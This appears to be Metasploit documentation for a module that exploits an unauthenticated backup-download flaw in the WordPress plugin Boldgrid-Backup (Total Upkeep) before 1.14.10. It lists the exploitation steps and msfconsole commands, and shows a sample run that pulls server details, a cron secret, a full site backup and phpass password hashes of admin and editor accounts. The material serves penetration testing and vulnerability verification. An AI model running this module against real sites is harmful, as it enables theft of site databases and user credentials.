## Vulnerable Application

This module exploits an unauthenticated database backup vulnerability in WordPress plugin
'Boldgrid-Backup' also known as 'Total Upkeep' version < 1.14.10.

Exploitation happens in a few steps:

1. First, `env-info.php` is read to get server information.
1. Next, `restore-info.json` is read to retrieve the last backup file.
1. That backup is then downloaded, and any sql files will be parsed looking for the `wp_users` `INSERT` statement to grab user creds.

A vulnerable version can be downloaded from here:
[Boldgrid Backup (Total Upkeep)](https://downloads.wordpress.org/plugin/boldgrid-backup.1.14.9.zip)

A free account will need to be registered at Boldgrid's site, and a serial key generated and applied.
Once the key is applied, click "Backup Site Now", or create a backup through other mechanisms in the
interface.

## Verification Steps

1. Install the plugin and create a backup
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/wp_total_upkeep_downloader`
1. Do: `set rhosts [ip]`
1. Do: `run`
1. You should get an archive backup.

## Options

## Scenarios

### Boldgrid-Backup (Total Upkeep) 1.14.9 on Wordpress 5.4.4 running on Ubuntu 20.04.

```
resource (total_upkeep.rb)> use auxiliary/scanner/http/wp_total_upkeep_downloader
resource (total_upkeep.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (total_upkeep.rb)> run
[+] 1.1.1.1 - Vulnerable version detected
[*] 1.1.1.1 - Obtaining Server Info
[+] 1.1.1.1 -
  gateway_interface: CGI/1.1
  http_host: 1.1.1.1
  php_sapi_name: apache2handler
  php_uname: Linux wordpress2004 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64
  php_version: 7.4.3
  server_addr: 1.1.1.1
  server_name: 1.1.1.1
  server_protocol: HTTP/1.1
  server_software: Apache/2.4.41 (Ubuntu)
  uid: 33
  username: www-data
[+] 1.1.1.1 - File saved in: /home/h00die/.msf4/loot/20201230163041_default_1.1.1.1_boldgridbackup._165408.txt
[*] 1.1.1.1 - Obtaining Backup List from Cron
200
[+] 1.1.1.1 -
  ABSPATH: /var/www/wordpress/
  archive_key: 0
  cron_secret: ab0d1ce965f799a90bd4f1bd5f3009471eb9e020a15408e3d91256e9cf3e74dd
  filepath: /var/www/wordpress/wp-content/boldgrid_backup_L8VjcGzUexMe/boldgrid-backup-1.1.1.1-ec5c393c-20201230-211323.zip
  siteurl: http://1.1.1.1
  site_title: localhost
  restore_cmd: php -d register_argc_argv="1" -qf "/var/www/wordpress/wp-content/plugins/boldgrid-backup/boldgrid-backup-cron.php" mode=restore siteurl=http%3A%2F%2F1.1.1.1 id=ec5c393c secret=ab0d1ce965f799a90bd4f1bd5f3009471eb9e020a15408e3d91256e9cf3e74dd archive_key=0 archive_filename=boldgrid-backup-1.1.1.1-ec5c393c-20201230-211323.zip site_title=localhost
  timestamp: 1609362824
[+] 1.1.1.1 - File saved in: /home/h00die/.msf4/loot/20201230163041_default_1.1.1.1_boldgridbackup._983176.txt
[*] 1.1.1.1 attempting download of wp-content/boldgrid_backup_L8VjcGzUexMe/boldgrid-backup-1.1.1.1-ec5c393c-20201230-211323.zip
[+] 1.1.1.1 - Database backup (22372663 bytes) saved in: /home/h00die/.msf4/loot/20201230163042_default_1.1.1.1_boldgridbackup._100789.zip
[*] 1.1.1.1 - Attempting to pull creds from wp-content/plugins/boldgrid-backup/vendor/ifsnop/mysqldump-php/tests/test001.src.sql
[*] 1.1.1.1 - Attempting to pull creds from wp-content/plugins/boldgrid-backup/vendor/ifsnop/mysqldump-php/tests/test002.src.sql
[*] 1.1.1.1 - Attempting to pull creds from wp-content/plugins/boldgrid-backup/vendor/ifsnop/mysqldump-php/tests/test005.src.sql
[*] 1.1.1.1 - Attempting to pull creds from wp-content/plugins/boldgrid-backup/vendor/ifsnop/mysqldump-php/tests/test006.src.sql
[*] 1.1.1.1 - Attempting to pull creds from wp-content/plugins/boldgrid-backup/vendor/ifsnop/mysqldump-php/tests/test008.src.sql
[*] 1.1.1.1 - Attempting to pull creds from wp-content/plugins/boldgrid-backup/vendor/ifsnop/mysqldump-php/tests/test009.src.sql
[*] 1.1.1.1 - Attempting to pull creds from wp-content/plugins/boldgrid-backup/vendor/ifsnop/mysqldump-php/tests/test010.src.sql
[*] 1.1.1.1 - Attempting to pull creds from wp-content/plugins/boldgrid-backup/vendor/ifsnop/mysqldump-php/tests/test011.src.sql
[*] 1.1.1.1 - Attempting to pull creds from wp-content/plugins/boldgrid-backup/vendor/ifsnop/mysqldump-php/tests/test012.src.sql
[*] 1.1.1.1 - Attempting to pull creds from wordpress_db.20201230-211322.sql
[+] wp_users
========

 user_login  user_pass
 ----------  ---------
 admin       $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
 admin2      $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1
 editor      $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/

[*] 1.1.1.1 - finished processing backup zip
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/wp_total_upkeep_downloader) > creds
Credentials
===========

host  origin         service  public  private                             realm  private_type        JtR Format
----  ------         -------  ------  -------                             -----  ------------        ----------
      1.1.1.1           admin2  $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1         Nonreplayable hash  phpass
      1.1.1.1           editor  $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/         Nonreplayable hash  phpass
      1.1.1.1           admin   $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0         Nonreplayable hash  phpass
```
